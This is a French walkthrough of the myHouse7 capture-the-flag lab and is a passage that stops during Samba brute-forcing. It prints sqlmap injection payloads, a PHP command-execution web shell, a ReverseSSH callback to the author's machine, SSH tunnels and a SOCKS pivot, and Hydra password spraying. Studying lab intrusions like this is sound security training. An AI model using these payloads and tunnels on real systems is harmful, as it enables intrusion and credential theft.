# Solution du CTF myHouse7 de VulnHub

Madness
-------

[myHouse7](https://www.vulnhub.com/entry/myhouse7-1,286/) est un CTF créé par [thepcn3rd](https://twitter.com/lokut) que je voulais faire depuis un moment. En effet ce dernier exploite pleinement Docker avec 7 containers qui permettent de simuler des réseaux sur lequels nous allons nous introduire au fûr et à mesure.  

Malheureusement le CTF est cassé et ne fonctionne pas correctement que ce soit sur VirtualBox ou VMWare. Il me fallait juste le temps et le courage de me pencher sur la raison de ce dysfonctionnement.  

Fix it, Boot it, Hack it
------------------------

Les raisons de cet échec sont au nombre de deux ou trois. Sous VirtualBox la VM ne parvient pas à obtenir l'adresse IP, ce qui arrive parfois sur de vieux CTFs. Je me souviens par exemple avoir dû supprimer un fichier lié à l'interface réseau sur l'un.  

Le second problème est directement lié puisque au démarrage de la VM celle-ci tente d'installer Docker via le répo de la distribution Linux. C'est d'autant plus regretable qu'à côté de ça l'auteur du CTF a pris soin de faire un export des containers Docker pour les charger localement (il aurait pu insister et mettre tout ça sur le Hub Docker).  

Et enfin le script chargé d'orchestrer tout ça agit selon différentes étapes en vérifiant que l'étape précédente a bien réussie via la présence de fichiers générés sur le disque... sauf que le script ne prend pas en charge les erreurs et génère les fichiers en question quoiqu'il en soit.  

Comme si ça ne suffisait pas, après l'installation de Docker qui a échouée et par conséquent le chargement des images Docker aussi, le script fait le ménage en les supprimant, rendant alors impossible la réparation de la VM après le premier boot.  

La procédure à suivre est donc la suivante :  

1. Importer la VM dans VirtualBox
2. Configurez là en mode *Accès par pont* (Bridge). Pas le mieux en terme de sécurité mais elle a besoin d'Internet pour récupérer Docker
3. La démarrer en laissant la touche Shift enfoncée pour atteindre le menu du boot manager (si l'étape échoue vous êtes bon pour supprimer et réimporter à nouveau)
4. Sélectionner le mode Recovery puis sélectionner l'entrée pour avoir un shell
5. Changer le mot de passe pour root (choisissez un mot de passe compatible qwerty, ce sera plus simple pour vous connecter ensuite)
6. Editer le script */etc/rc.local* pour commenter (ou supprimer) l'appel au script */home/bob/setup/buildDockerNet.sh*
7. Redémarrer la VM

A ce stade la VM est démarrée, les fichiers nécessaires sont toujours présents et vous disposez d'un accès root possible via la console.  

1. Connectez vous
2. Récupérez le nom de l'interface réseau via *ifconfig*. Si vous ne voyez que l'interface loopback (lo), regardez dans l'output de la commande *dmesg*, ça peut être *eth0* ou ça peut correspondre au nom de votre interface normale (en dehors de la VM)
3. Définissez une adresse IP pour la VM avec la commande *ifconfig <interface> inet <adresse\_ip> netmask <netmask\_correspondant>*
4. Définissez le routeur à utiliser via *route add default gw <adresse\_ip\_routeur> <interface>*
5. Créez le fichier */etc/resolv.conf* et mettez la ligne *nameserver 8.8.8.8* à l'intérieur
6. Vérifiez que la connexion Internet est fonctionnelle (*ping -c 1 perdu.com*)

Normalement arrivé ici tout est prêt. Editez tout de même le script */home/bob/setup/buildDockerNet.sh* pour commenter les étapes qui suppriment des fichiers, juste au cas où.  

Exécuter le script, vous devriez voir Docker s'installer, les images être chargées et les containers se lancer. Victoire ! Profitez-en pour créer un instantané de la VM, vous n'avez pas envie de recommencer si un problème apparait.  

Our house, in the middle of our street
--------------------------------------

HTTP ? Oui.  

```plain
$ sudo nmap -T5 -p- -sCV 192.168.1.50
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-29 12:07 CET
Nmap scan report for 192.168.1.50
Host is up (0.00027s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6f:a7:72:5b:0d:81:8e:a5:40:6a:75:62:0c:f4:73:1a (RSA)
|   256 fb:61:87:c4:1f:18:da:dc:96:2b:65:08:ac:19:0a:fe (ECDSA)
|_  256 92:4a:17:6c:4d:68:5e:6a:1b:89:94:17:e9:81:33:3a (ED25519)
25/tcp    open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_smtp-commands: Couldn't establish connection on port 25
443/tcp   open  http        Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
8008/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
8111/tcp  open  skynetflow?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: {{tryharder:114}}
|     Vary: Accept-Encoding
|     Content-Length: 218
|     Connection: close
|     Content-Type: text/html; charset=UTF-8
|     <html>
|     <body bgcolor=gray>
|     <center>
|     /><br /><br />
|     HELLO<br /><br />
|     STRANGE GAME.<br />
|     ONLY WINNING MOVE IS<br />
|     PLAY.<br /><br />
|     ABOUT A NICE GAME OF CHESS?<br /><br />
|     </body>
|     </html>
|   Help: 
|     HTTP/1.1 400 Bad Request
|     Server: {{tryharder:114}}
|     Content-Length: 300
|     Connection: close
|     Content-Type: text/html; charset=iso-8859-1
|     <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|     <html><head>
|     <title>400 Bad Request</title>
|     </head><body>
|     <h1>Bad Request</h1>
|     <p>Your browser sent a request that this server could not understand.<br />
|     </p>
|     <hr>
|     <address>{{tryharder:114}} Server at 172.31.200.85 Port 80</address>
|     </body></html>
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Server: {{tryharder:114}}
|     Content-Length: 300
|     Connection: close
|     Content-Type: text/html; charset=iso-8859-1
|     <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|     <html><head>
|     <title>400 Bad Request</title>
|     </head><body>
|     <h1>Bad Request</h1>
|     <p>Your browser sent a request that this server could not understand.<br />
|     </p>
|     <hr>
|     <address>{{tryharder:114}} Server at 172.31.200.85 Port 80</address>
|_    </body></html>
8112/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
8115/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: Anchor CMS
|_http-title: My posts and thoughts - IT222 Blog
10000/tcp open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
20000/tcp open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

L'objectif du CTF est de récolter 20 flags, chacun sous la forme *{{tryharder:XXX}}* où *XXX* représente un chiffre. On voit via Nmap que l'on en a déjà récupéré un :)  

Mais soyons bien organisés et agissons dans l'ordre avec le port 25. La page indique *Welcome to the Database Management System* et on trouve un flag dans le code source :  

```html
<input type="hidden" value="{{tryharder:999}}" />
```

Le serveur ne répond pas via un code 404 pour les pages manquantes mais via un code HTTP 200 sans contenu. Heureusement *feroxbuster* a une option pour exclure selon la taille de la réponse.  

```plain
$ feroxbuster -u http://192.168.1.50:25/ -w DirBuster-0.12/directory-list-2.3-big.txt -S 0 -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.1.50:25/
 🚀  Threads               │ 50
 📖  Wordlist              │ DirBuster-0.12/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💢  Size Filter           │ 0
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        1l        9w       59c http://192.168.1.50:25/f
200        1l        1w       18c http://192.168.1.50:25/flag
403       11l       32w      300c http://192.168.1.50:25/server-status
```

La première page retourne *{{tryharder:217}} - There is one more in this directory...* et la seconde *{{tryharder:714}}*.  

Les ports 443, 8008, 8112 et 10000 semblent être en tout points identiques au port 25.  

Our house, was our castle and our keep
--------------------------------------

Le port 8111 répond avec une référence à l'excellent film *Wargames* :  

```html
$ curl -D- http://192.168.1.50:8111/
HTTP/1.1 200 OK
Server: {{tryharder:114}}
Vary: Accept-Encoding
Content-Length: 218
Content-Type: text/html; charset=UTF-8

<html>
<body bgcolor=gray>
<center>
<br /><br /><br />
HELLO<br /><br />
A STRANGE GAME.<br />
THE ONLY WINNING MOVE IS<br />
NOT TO PLAY.<br /><br />
HOW ABOUT A NICE GAME OF CHESS?<br /><br />
<br />
</body>
</html>
```

On retrouve donc le flag vu précédemment avec Nmap. La bannière du serveur a été modifiée pour contenir le flag, ce dernier apparait donc dans les entêtes HTTP mais aussi dans la signature des pages sur les erreurs 404.  

Ce port est en réalité celui sur lequel j'ai récupéré mes derniers flags car il m'a fallut utiliser des wordlists moins fréquentes pour retrouver les fichiers cachés.  

```plain
$ feroxbuster -u http://192.168.1.50:8111/ -w wordlists/files/Directories_All.wordlist -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.1.50:8111/
 🚀  Threads               │ 50
 📖  Wordlist              │ wordlists/files/Directories_All.wordlist
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
403       11l       31w      293c http://192.168.1.50:8111/.htpasswd
403       11l       31w      297c http://192.168.1.50:8111/.htpasswd.php
200       12l       39w      218c http://192.168.1.50:8111/index.php
200        1l        1w       11c http://192.168.1.50:8111/c.php
200        5l       18w      173c http://192.168.1.50:8111/b.php
403       11l       31w      293c http://192.168.1.50:8111/.htaccess
403       11l       31w      297c http://192.168.1.50:8111/.htaccess.php
403       11l       31w      294c http://192.168.1.50:8111/.htpasswds
403       11l       31w      298c http://192.168.1.50:8111/.htpasswds.php
```

Le script *b.php* contient un formulaire avec un champ caché baptisé *command* qui par défaut va lister le contenu de */etc/backup/*. La cible de ce script est le fichier *c.php*. On est là dans un cas très simple d'exécution de commande distante (RCE).  

```bash
$ curl -XPOST http://192.168.1.50:8111/c.php --data "command=id"
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Je n'irais pas plus loin dans cette vulnérabilité car comme dit précédemment je l'ai découverte en dernier et tout le reste était déjà terminé mais dans le même dossier que les scripts se trouvait un fichier *5ac4b37ac5bf324---flag---5ac4b37ac5bf324* contenant le flag *{{tryharder:511}}* et dans le dossier */etc/backup/* se trouvait un fichier *flag.txt* avec le contenu *{{tryharder:1}}*.  

Comme vous le verrez par la suite le CTF n'avait pas de cas particuliers d'exploitation (via l'utilisation d'un exploit existant pour une application trouée) et se concentrait sur la nécessité de pivoter avec du password spraying.  

Our house, that was where we used to sleep
------------------------------------------

Avant d'entrer dans le vif du sujet, petit tour sur le port 20000 qui donne un healthcheck des différents containers sur la machine.  

La page fournit aussi le flag *{{tryharder:1}}* de manière visible et via le code source un second caché :  

```html
<input type=hidden value="{{tryharder:007}}" />
```

Le port 8115 correspond à une installation de [Anchor CMS](http://anchorcms.com/), ce que l'on devine rapidement via la balise méta *generator* du site.  

Pour ce qui est du contenu on a plus affaire à un blog et on peut en extraire les différentes informations :  

* We would like to welcome Heather to our fast growing team.
* Thank you Larry Jr. for joining the team!!
* Please make sure that as an hourly employee you record your time in the /timeclock/ software. This helps us record the volunteer hours that are put into the creation of our product.
* I noticed that the database is running as the "root" user. I found this out by running "\! whoami". I could be wrong, can you double-check!
* I made significant changes to the code of the timeclock software. Due to the changes I made, I stored a backup in /timeclock/backup/.

On s'empresse donc de noter les différents utilisateurs (*larry*, *heather*) dans un fichier texte pour la suite.  

Concernant la base de données tournant en tant que *root* cette histoire de point d'exclamation ne parraissait un peu gros (si on pouvait exécuter du code sur un serveur MySQL aussi facilement je pense que j'en aurais eu vent). En fait le client MySQL permet bien de faire exécuter des commandes via son invite mais localement, pas sur le serveur :p  

A l'adresse */timeclock/* mentionnée on trouve une mire de login avec une référence *Employee Timeclock Software 0.99* qui semble indiquer qu'on a ici une vrai application web (pas du code maison).  

Enfin dans le sous-dossier backup se trouve un flag (*{{tryharder:107}}*) ainsi qu'une archive *all.zip* dont le contenu semble raccord à l'application web.  

```plain
Archive:  all.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     2620  2018-10-24 01:33   add_entry.php
     2002  2018-10-24 01:34   add_period.php
     1174  2018-10-24 01:34   add_type.php
     2332  2018-10-24 01:35   add_user.php
     1633  2018-10-24 01:32   auth.php
        0  2018-10-24 01:41   backup/
     2125  2018-10-24 01:35   change_password.php
      427  2018-10-24 01:25   db.php
      276  2018-10-24 01:11   dbtest.php
     1196  2018-10-24 01:36   delete_entry.php
     1509  2018-10-24 01:22   delete_period.php
     1362  2018-10-24 01:36   delete_type.php
     1348  2018-10-24 01:37   delete_user.php
     3677  2018-10-24 01:38   edit_entry.php
     2615  2018-10-24 01:39   edit_period.php
     1453  2018-10-24 01:40   edit_type.php
     2775  2018-10-24 01:40   edit_user.php
     1780  2018-10-24 01:23   index.php
     1069  2018-10-24 01:25   login.php
    17208  2006-05-03 00:07   readme.htm
     1999  2018-10-24 01:24   time_entry.php
     1953  2018-10-24 01:24   time_periods.php
     1557  2018-10-24 01:24   time_types.php
      735  2006-05-02 21:27   timeapp.css
     2277  2006-05-03 00:04   timeclock.sql
     1823  2018-10-24 01:24   users.php
     1787  2018-10-24 01:24   view_data.php
     3126  2018-10-24 01:25   view_entry.php
---------                     -------
    63838                     28 files
```

A regarder le code de chacun de ces scripts, ceux-ci sont bourrés de vulnérabilités, c'est [le DADV](https://www.youtube.com/watch?v=BVfPV8jfh-4) de la faille SQL.  

La configuratin de la base de données se situe dans le script *db.php*.  

```php
$db = mysqli_connect("172.31.20.10", "root", "anchordb", "timeclock");
```

Il n'y a pas de manquement à l'authentification (on est correctement redirigés vers la page de login si non connecté) mais la page de login fait partie des scripts faillibles.  

```plain
$ python sqlmap.py -u "http://192.168.1.50:8115/timeclock/index.php"  --data "username=admin&password=ee&submit=Log+In" --dbms mysql --level 5 --risk 3

sqlmap identified the following injection point(s) with a total of 813 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=admin%' AND 2271=(SELECT (CASE WHEN (2271=2271) THEN 2271 ELSE (SELECT 8293 UNION SELECT 8771) END))-- -&password=ee&submit=Log In

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin%' AND (SELECT 9416 FROM (SELECT(SLEEP(5)))ASLP) AND 'WVuj%'='WVuj&password=ee&submit=Log In
---
[15:12:27] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29, PHP
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```

Je paste ici les dumps les plus intéressants :  

```plain
available databases [6]:
[*] anchor
[*] flag
[*] information_schema
[*] mysql
[*] performance_schema
[*] timeclock

Database: flag
Table: flag
[1 entry]
+-------------------+
| flag              |
+-------------------+
| {{tryharder:766}} |
+-------------------+

Database: timeclock
Table: user_info
[5 entries]
+---------+---------+---------+---------------+----------+----------+
| user_id | lname   | fname   | level         | username | password |
+---------+---------+---------+---------------+----------+----------+
| 1       | Admin   | Admin   | Administrator | admin    | admin    |
| 5       | yool    | heather | Administrator | heather  | heather  |
| 4       | tin     | larryjr | Administrator | larryjr  | larryjr  |
| 6       | <blank> | user1   | User          | user1    | user1    |
| 7       | user2   | user2   | User          | user2    | user2    |
+---------+---------+---------+---------------+----------+----------+

Database: anchor
Table: anchor_users
[4 entries]
+----+-------------------+---------------+---------------------+--------+---------------------+----------+--------------------------------------------------------------+---------------+
| id | bio               | role          | email               | status | updated             | username | password                                                     | real_name     |
+----+-------------------+---------------+---------------------+--------+---------------------+----------+--------------------------------------------------------------+---------------+
| 1  | The bouse         | administrator | myemail@local.local | active | 2018-10-22 04:20:20 | admin    | $2y$12$XyIp48YfHyfF8m6UfeN2nO3kLk.PgnL6Lz/pQolT4rDzsyYHGsSdC | Administrator |
| 2  | <blank>           | administrator | jim@test.local      | active | 2018-10-23 03:59:30 | jim      | $2y$12$MaNoQI.ro2vd3Eplh0m.u.Fs/POoCoADcRFCExYhFvX9nSPk6F7Vi | jim           |
| 3  | <blank>           | administrator | heather@local.local | active | 2018-10-23 04:10:46 | heather  | $2y$12$RXw2Ye66qe5FtirI/95mFeQMQt2L7jezw9evcA8DEg0QOp3YZE2xq | heather       |
| 4  | {{tryharder:913}} | administrator | larryjr@local.local | active | 2018-10-23 04:19:37 | larryjr  | $2y$12$2jeSR68yBEVqJ88kA16HJ.qgjMy963lXyUY.7AAfKRSCGD1zgK62i | larryjr       |
+----+-------------------+---------------+---------------------+--------+---------------------+----------+--------------------------------------------------------------+---------------+
```

Un flag de plus ! Pour le reste les hashs se cassent rapidement :  

```plain
$2y$12$MaNoQI.ro2vd3Eplh0m.u.Fs/POoCoADcRFCExYhFvX9nSPk6F7Vi:password
$2y$12$RXw2Ye66qe5FtirI/95mFeQMQt2L7jezw9evcA8DEg0QOp3YZE2xq:heather
$2y$12$XyIp48YfHyfF8m6UfeN2nO3kLk.PgnL6Lz/pQolT4rDzsyYHGsSdC:anchor
$2y$12$2jeSR68yBEVqJ88kA16HJ.qgjMy963lXyUY.7AAfKRSCGD1zgK62i:larryjr
```

Avec l'option *--privileges* de SQLmap je peux dumper la liste des droits dont je dispose sur le serveur MySQL et ils sont nombreux puisque l'utilisateur *root* de la DB est utillisé. Je peux ainsi si je le souhaite lire */etc/passwd* avec *--file-read* de SQLmap.  

En revanche impossible de charger */etc/shadow* donc effectivement cette histoire de base de données tournant en root était fausse.  

Father wears his Sunday best
----------------------------

Le dernier fichier présent dans */timeclock/backup/* est un script nommé *browse\_backups.php* et là encore il permet l'exécution de commande.  

Il est tout simple :  

```php
<pre><?php

if(isset($_GET['cmd'])){
        echo "<pre>";
        $cmd = ($_GET['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>
```

Sur le serveur je peux rappatrier un [ReverseSSH](https://github.com/Fahrj/reverse-ssh) pour établir un tunnel avec ma machine :  

```bash
$ ./reverse-sshx64 -v -p 4444 192.168.1.47
```

Sur ma machine j'étais à l'écoute :  

```bash
$ ./reverse-sshx64 -v -l -p 4444
```

Une fois le tunnel établit il suffit d'utiliser le port SSH local 8888 comme si il s'agissait du serveur SSH de notre victime.  

```bash
$ ssh -p 8888 127.0.0.1
```

Le mot de passe attendu (hardcodé dans ReverseSSH) est *letmeinbrudipls* et le nom d'utilisateur n'a pas d'importance.  

Un nouveau flag s'offre à moi dans le fichier */var/www/html/anchor/config/db.php*.  

```php
<?php

# {{tryharder:737}}

return [
    'default'     => 'mysql',
    'prefix'      => 'anchor_',
    'connections' => [
        'mysql' => [
            'driver'   => 'mysql',
            'hostname' => '172.31.20.10',
            'port'     => '3306',
            'username' => 'root',
            'password' => 'anchordb',
            'database' => 'anchor',
            'charset'  => 'utf8mb4'
        ]
    ]
];
```

Le container sur lequel on a atteri a deux interfaces :  

```plain
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.31.10.17  netmask 255.255.255.0  broadcast 172.31.10.255
        ether 02:42:ac:1f:0a:11  txqueuelen 0  (Ethernet)
        RX packets 251484  bytes 55303764 (55.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 329546  bytes 56740553 (56.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.31.20.27  netmask 255.255.255.0  broadcast 172.31.20.255
        ether 02:42:ac:1f:14:1b  txqueuelen 0  (Ethernet)
        RX packets 319622  bytes 40501808 (40.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 380399  bytes 45040314 (45.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

J'uploade un Nmap compilé statiquement sur le serveur (*sftp -P 8888 127.0.0.1* grace au tunnel)  
 et je scanne les deux réseaux à la recherche d'hôtes valides.  

```plain
./nmap -T5 -sP 172.31.10.27/24

Starting Nmap 7.11 ( https://nmap.org )
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.31.10.1
Host is up (0.00091s latency).
Nmap scan report for e26631a2bf39 (172.31.10.17)
Host is up (0.00056s latency).
Nmap scan report for blue.net10 (172.31.10.22)
Host is up (0.0025s latency).
Nmap scan report for red.net10 (172.31.10.25)
Host is up (0.0012s latency).
Nmap scan report for africa.net10 (172.31.10.194)
Host is up (0.00031s latency).
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.93 seconds

./nmap -T5 -sP 172.31.20.27/24

Starting Nmap 7.11 ( https://nmap.org )
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.31.20.1
Host is up (0.0013s latency).
Nmap scan report for db1srv.net20 (172.31.20.10)
Host is up (0.00016s latency).
Nmap scan report for e26631a2bf39 (172.31.20.27)
Host is up (0.00020s latency).
Nmap scan report for utah.net20 (172.31.20.44)
Host is up (0.00048s latency).
Nmap scan report for africa.net20 (172.31.20.194)
Host is up (0.00090s latency).
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.74 seconds
```

J'enchaine sur un scan des ports des IPs qui ont répondu. Voici pour le premier réseau :  

```plain
map scan report for 172.31.10.1
Host is up (0.00053s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
443/tcp   open  https
8008/tcp  open  unknown
8111/tcp  open  unknown
8112/tcp  open  unknown
8115/tcp  open  unknown
10000/tcp open  webmin
20000/tcp open  unknown

Nmap scan report for blue.net10 (172.31.10.22)
Host is up (0.0013s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for red.net10 (172.31.10.25)
Host is up (0.0013s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for africa.net10 (172.31.10.194)
Host is up (0.00048s latency).
All 65535 scanned ports on africa.net10 (172.31.10.194) are closed
```

*172.31.10.1* correspond à l'hôte mis à part que le port SSH est accessible.  

Et sur le second réseau :  

```plain
Nmap scan report for 172.31.20.1
Host is up (0.00053s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
443/tcp   open  https
8008/tcp  open  unknown
8111/tcp  open  unknown
8112/tcp  open  unknown
8115/tcp  open  unknown
10000/tcp open  webmin
20000/tcp open  unknown

Nmap scan report for db1srv.net20 (172.31.20.10)
Host is up (0.0013s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap scan report for utah.net20 (172.31.20.44)
Host is up (0.0013s latency).
All 65535 scanned ports on utah.net20 (172.31.20.44) are closed

Nmap scan report for africa.net20 (172.31.20.194)
Host is up (0.00048s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
24/tcp open  unknown
```

Une connexion à ce port 24 à l'aide de Netcat révèle qu'il s'agit d'un serveur SSH. On va utiliser un premier pivot pour y accéder :  

```bash
$ ssh -N -L 2424:172.31.20.194:24 -p 8888 127.0.0.1
```

Ici j'utilise le tunnel SSH existant avec la première machine pour forwarder en local un port sur la seconde machine.  

J'ai rajouté les identifiants de base de données et autres dumps SQL à ma liste d'utilisateurs et passwords potentiels. Je passe le tout à Hydra :  

```plain
 $ ./hydra -e nsr -L /tmp/users.txt -P /tmp/pass.txt ssh://127.0.0.1:2424/
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 153 login tries (l:9/p:17), ~10 tries per task
[DATA] attacking ssh://127.0.0.1:2424/
[2424][ssh] host: 127.0.0.1   login: root   password: anchor
1 of 1 target successfully completed, 1 valid password found
```

Pwned ! Dans */root* on trouve le flag *{{tryharder:391}}* et un autre dans la crontab générale :  

```plain
root@cfbd57786836:~# cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
5/* * * * *     root    logger "{{tryharder:301}}" &> /dev/null
```

Cette machine a accès à un réseau supplémentaire :  

```plain
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.31.10.194  netmask 255.255.255.0  broadcast 172.31.10.255
        ether 02:42:ac:1f:0a:c2  txqueuelen 0  (Ethernet)
        RX packets 8049789  bytes 1573186897 (1.5 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 65649  bytes 3543714 (3.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.31.20.194  netmask 255.255.255.0  broadcast 172.31.20.255
        ether 02:42:ac:1f:14:c2  txqueuelen 0  (Ethernet)
        RX packets 365982  bytes 67129189 (67.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 67442  bytes 3892074 (3.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth2: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.31.200.194  netmask 255.255.255.0  broadcast 172.31.200.255
        ether 02:42:ac:1f:c8:c2  txqueuelen 0  (Ethernet)
        RX packets 19  bytes 1426 (1.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Et Nmap est préinstallé ! Charmante attention :)  

The kids are playing up downstairs
----------------------------------

Ce qui ressort du scan de ce nouveau réseau c'est surtout un serveur SMB :  

```plain
Nmap scan report for two.net200 (172.31.200.204)
Host is up (0.000063s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:42:AC:1F:C8:CC (Unknown)
Service Info: Host: F34A6019FB92

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: f34a6019fb92
|   NetBIOS computer name: F34A6019FB92\x00
|   Domain name: \x00
|_  FQDN: f34a6019fb92
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
```

C'est là où ça devient un poil plus tricky. Grace à notre accès SSH sur la seconde machine (forwardé sur le port 2424 local) on va créer un serveur proxy SOCKS via SSH qui permettra d'atteindre les machines de ce réseau (et surtout le serveur Samba).  

```plain
$ ssh -D 1080 -N -p 2424 root@127.0.0.1
```

Il faut après éditer le fichier de configuration de proxychains pour y mettre la ligne suivante :  

```plain
socks5 127.0.0.1 1080
```

[Proxychains](https://github.com/rofl0r/proxychains-ng) permet de chainer plusieurs proxies, il suffit de les mettre les un après les autres (dans l'ordre, ligne après ligne).  

Avec smbclient je peux établir une connexion invité et lister les partages :  

```plain
$ ./proxychains4 -f proxychains.conf smbclient -U "" -N -L //172.31.200.204
[proxychains] config file found: proxychains.conf
[proxychains] preloading ./libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.15-git-1-g7de7dd0
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.31.200.204:445  ...  OK

        Sharename       Type      Comment
        ---------       ----      -------
        users           Disk      Users Drive - Samba on Ubuntu
        companyInfo     Disk      Company Info - Samba on Ubuntu
        IPC$            IPC       IPC Service (f34a6019fb92 server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Sans l'utilisation de l'option *-q* de Proxychains on peut voir le cheminement des paquets :)  

Malheureusement l'accès aux partages est protégé. J'ai tenté de bruteforcer les accès avec les outils et résultats suivants :  

* Hydra : n'a rien trouvé
